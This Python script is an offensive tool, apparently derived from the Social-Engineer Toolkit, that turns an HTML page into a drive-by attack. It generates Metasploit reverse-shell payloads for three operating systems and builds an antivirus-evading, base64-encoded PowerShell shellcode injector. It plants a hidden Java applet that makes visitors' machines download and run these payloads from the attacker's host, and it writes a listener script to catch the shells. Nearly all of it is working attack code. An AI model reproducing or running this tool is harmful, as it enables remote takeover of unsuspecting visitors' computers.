#!/usr/bin/env python

# This program was heavily inspired by the Social-Engineer Toolkit's Java applet web attack.
# It was written in a desire to deal with the constent stability issues encountered in SET.

from __future__ import with_statement
import subprocess, string, random, base64
import os
import shutil
import sys
import re
import getopt

#Hardcoding for metasploit absolute path.
msfpath = ''
if len(msfpath) > 1 and msfpath[len(msfpath)-1] != "/":
	msfpath += "/"

WINDOWS_DEFAULT = 'windows/meterpreter/reverse_tcp'
LINUX_DEFAULT = 'linux/x86/meterpreter/reverse_tcp'
OSX_DEFAULT = 'osx/x86/shell_reverse_tcp'

WINDOWS_PORT = 3000
LINUX_PORT = 3001
OSX_PORT = 3002

def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters # + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])

# shellcode_replace function from the Social-Engineer Toolkit
def shellcode_replace(ipaddr, port, shellcode):
    # split up the ip address
    ip = ipaddr.split('.')
    # join the ipaddress into hex value spaces still in tact
    ipaddr = ' '.join((hex(int(i))[2:] for i in ip))

    # We use a default 255.254.253.252 on all shellcode then replace
    # 255.254.253.252 --> hex --> ff fe fd fc
    # 443 = '0x1bb'
    if port != "443":
        port = hex(int(port))
        # hack job in order to get ports into right format
        # if we are only using three numbers then you have to flux in a zero
        if len(port) == 5:
            port = port.replace("0x", "\\x0")
        else:
            port = port.replace("0x", "\\x")
        # here we break the counters down a bit to get the port into the right
        # format
        counter = 0
        new_port = ""
        for a in port:
            if counter < 4:
                new_port += a
            if counter == 4:
                new_port += "\\x" + a
                counter = 0
            counter = counter + 1
        # redefine the port in hex here
        port = new_port

    ipaddr = ipaddr.split(" ")
    first = ipaddr[0]
    # split these up to make sure its in the right format
    if len(first) == 1:
        first = "0" + first
    second = ipaddr[1]
    if len(second) == 1:
        second = "0" + second
    third = ipaddr[2]
    if len(third) == 1:
        third = "0" + third
    fourth = ipaddr[3]
    if len(fourth) == 1:
        fourth = "0" + fourth

    # put the ipaddress into the right format
    ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first, second, third, fourth)
    shellcode = shellcode.replace(r"\xff\xfe\xfd\xfc", ipaddr)

    if port != "443":
        # getting everything into the right format
        if len(port) > 4:
            port = "\\x00" + port
        # if we are using a low number like 21, 23, etc.
        if len(port) == 4:
            port = "\\x00\\x00" + port
        shellcode = shellcode.replace(r"\x00\x01\xbb", port)

    # return shellcode
    return shellcode

# generate_shellcode function from the Social-Engineer Toolkit
def generate_shellcode(payload, ipaddr, port):
    port = port.replace("LPORT=", "")
    with open(os.devnull, 'w') as devnull:
        proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" %
             (msfpath, payload, ipaddr, port), stdout=subprocess.PIPE, stderr=devnull, shell=True)
    data, err = proc.communicate()
    data = data.decode('ascii')
    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=',
             'unsignedcharbuf[]=', "b'", "'", '\\n']
    for repl in repls:
        data = data.replace(repl, "")
    return data 

# generate_powershell_alphanumeric_payload function from the Social-Engineer Toolkit
def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
    # generate our shellcode first
    shellcode = generate_shellcode(payload, ipaddr, port)
    try:

        # if not "reverse_http" in payload or not "reverse_https" in payload:
        if not "http" in payload:
            shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
        # sub in \x for 0x
        shellcode = re.sub("\\\\x", "0x", shellcode)
        shellcode = shellcode.replace("\\", "")
        # base counter
        counter = 0
        # count every four characters then trigger floater and write out data
        floater = ""
        # ultimate string
        newdata = ""
        for line in shellcode:
            floater = floater + line
            counter = counter + 1
            if counter == 4:
                newdata = newdata + floater + ","
                floater = ""
                counter = 0

        # heres our shellcode prepped and ready to go
        shellcode = newdata[:-1]

    except Exception as e:
        print_error("Something went wrong, printing error: " + str(e))
    # powershell command here, needs to be unicoded then base64 in order to
    # use encodedcommand - this incorporates a new process downgrade attack
    # where if it detects 64 bit it'll use x86 powershell. This is useful so
    # we don't have to guess if its x64 or x86 and what type of shellcode to
    # use
    # added random vars before and after to change strings - AV you are
    # seriously ridiculous.
    var1 = generate_random_string(3, 4)
    var2 = generate_random_string(3, 4)
    var3 = generate_random_string(3, 4)
    var4 = generate_random_string(3, 4)
    var5 = generate_random_string(3, 4)
    var6 = generate_random_string(3, 4)

    # one line shellcode injection with native x86 shellcode
    powershell_code = (
        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-e ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)

    # run it through a lame var replace
    powershell_command = powershell_code.replace("$1", "$" + var1).replace(
        "$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)

    # unicode and base64 encode and return it
    return base64.b64encode(powershell_command.encode('utf_16_le')).decode("ascii")


# This applet template was taken directly from SET's code, and was slightly modified.
# https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/webattack/web_clone/applet.database
APPLET_TEMPLATE = '<applet code="Java.class" width="1" height="1" archive="applet.jar"><param name="name"><param name="1" value="http://ipaddrhere/msf.exe"><param name="2" value=""><param name="3" value="http://ipaddrhere/mac.bin"><param name="4" value="http://ipaddrhere/nix.bin"><param name="5" value="PowershellInjectionCodeGoesHere"><param name="6" value="PowershellInjectionCodeGoesHere"><param name="7" value="freehugs"><param name="8" value="YES"><param name="9" value=""><param name="10" value=""><param name="separate_jvm" value="true"></applet>'

def print_usage():
    print("""
Usage:
  {prog} [-w <payload>] [-l <payload>] [-m <payload>] <html_file> <ip>
  {prog} -h

Options:
  -h            Shows this help message.
  -w            Specifies the Windows payload to use. [default: {windows}]
  -l            Specifies the Linux payload to use. [default: {linux}]
  -m            Specifies the Mac OS X payload to use. [default: {osx}]
  <payload>     The payload string as expected by msfvenom. Run `msfvenom -l payloads` to see all choices.
  <html_file>   The HTML file to insert the Java payload.
  <ip>          The IP address the payload should connect back to.

Note: The default ports used for the Windows, Linux, and Mac listeners are 3000, 3001, and 3002 respectively.
""".format(prog=sys.argv[0], windows=WINDOWS_DEFAULT, linux=LINUX_DEFAULT, osx=OSX_DEFAULT))

def perform_checks():
  try:
    os.mkdir('output')
  except OSError:
    pass
  if not os.path.isdir('output'):
    print('Unable to create output directory. Please ensure that the current directory is writable.')
    return False
  return True

if __name__ == '__main__':
  if not perform_checks():
    sys.exit()

  # Accept -h -w -l and -m options and make -w -l and -m require an argument.
  optlist, args = getopt.getopt(sys.argv[1:], 'hw:l:m:')
  if len(args) < 2:
    print_usage()
    print('Error: You did not specify a required argument. Please specify an html file to modify and an IP address to connect back to.')
    sys.exit()

  html_filename = args[0]
  ip_address = args[1]

  windows = WINDOWS_DEFAULT
  linux = LINUX_DEFAULT
  osx = OSX_DEFAULT

  for opt, arg in optlist:
    if opt == '-h':
      print_usage()
      sys.exit()
    elif opt == '-w':
      windows = arg
    elif opt == '-l':
      linux = arg
    elif opt == '-m':
      osx = arg

  print('Generating Windows payload: {payload}...'.format(payload=windows))
  os.system('{msfp}msfvenom -p {payload} -f exe LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(msfp=msfpath, payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
  print('Generating Linux payload: {payload}...'.format(payload=linux))
  os.system('{msfp}msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(msfp=msfpath, payload=linux, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
  print('Generating Mac OS X payload: {payload}...'.format(payload=osx))
  os.system('{msfp}msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(msfp=msfpath, payload=osx, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))
  print("Generating x86-based powershell injection code...")
  x86 = str(generate_powershell_alphanumeric_payload(windows, ip_address, str(WINDOWS_PORT), ''))

  print('Weaponizing html...')
  shutil.copy('applet.jar', 'output')

  with open(html_filename, 'r') as html_infile:
    with open(os.path.join('output', 'index.html'), 'w') as html_outfile:
      html = html_infile.read()
      applet_code = re.sub('ipaddrhere', ip_address, APPLET_TEMPLATE)
      weaponized_html = re.sub('</body>', applet_code + '\n</body>', html, re.I)
      weaponized_html = weaponized_html.replace("PowershellInjectionCodeGoesHere",x86)
      html_outfile.write(weaponized_html)

  print('Creating listener resource script...')
  with open(os.path.join('output', 'listeners.rc'), 'w') as resource_file:
    resource_file.write("""\
use exploit/multi/handler
set PAYLOAD {windows_payload}
set LHOST {ip_address}
set LPORT {windows_port}
set ExitOnSession False
exploit -j

set PAYLOAD {linux_payload}
set LHOST {ip_address}
set LPORT {linux_port}
set ExitOnSession False
exploit -j

set PAYLOAD {osx_payload}
set LHOST {ip_address}
set LPORT {osx_port}
set ExitOnSession False
exploit -j

sleep 1
echo "You may now surf to http://{ip_address}/"
""".format(
    ip_address=ip_address,
    windows_payload=windows,
    linux_payload=linux,
    osx_payload=osx,
    windows_port=WINDOWS_PORT,
    linux_port=LINUX_PORT,
    osx_port=OSX_PORT,
  ))

  print('All output written to the "output" directory.')
  print()
  print('Run "serve.sh" to easily stand up a server.')
  print()
  print('Otherwise, run the server manually like so:')
  print('\tStart your Metasploit listeners using the command: msfconsole -r output/listeners.rc')
  print('\tThen copy the remaining files in your output directory to your web root (usually /var/www/).')
  print('\tAlternatively, start a lightweight webserver using the command: cd output && python3 -m http.server 80')

